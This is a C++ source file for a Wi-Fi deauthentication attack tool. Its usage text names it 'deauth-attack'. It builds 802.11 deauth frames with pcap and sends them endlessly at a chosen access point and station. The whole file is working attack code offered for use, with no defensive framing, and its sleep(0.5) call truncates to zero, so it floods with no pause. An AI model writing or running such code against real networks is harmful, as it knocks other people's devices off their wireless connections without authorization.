#include <pcap.h>
#include <iostream>
#include <net/if.h>
#include <unistd.h>

#include "send_deauth.h"
#include "radiotaphdr.h"
#include "beaconhdr.h"
#include "mac.h"


#define DEAUTH_BROADCAST 0
#define DEAUTH_UNICAST 1


char deauthPacket[38];

void usage(){
    std::cout << "syntax : deauth-attack <interface> <ap mac> [<station mac>]\n";
    std::cout << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n"; 
}

void deauth(pcap_t* handle, Mac apMac, Mac stationMac){
    int res;
    PRadiotapHdr radiotapHdr = (PRadiotapHdr) deauthPacket;
    radiotapHdr->len_ = 12;
    radiotapHdr->present_ = 0x00008004;

    PBeaconHdr beaconHdr = (BeaconHdr*) ((char*)deauthPacket+radiotapHdr->len_);

    beaconHdr->ver_ = 0;
    beaconHdr->type_ = 0;
    beaconHdr->subtype_ = 12;
    beaconHdr->addr1_ = stationMac;
    beaconHdr->addr2_ = apMac;
    beaconHdr->addr3_ = apMac;
    
    while(true){
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&deauthPacket[0]), sizeof(deauthPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        sleep(0.5);
        std::cout << "[*] Packet sent - Packet Info | AP Mac: " << apMac.operator std::string() <<  " | Station Mac: " << stationMac.operator std::string() << std::endl;
    }
}
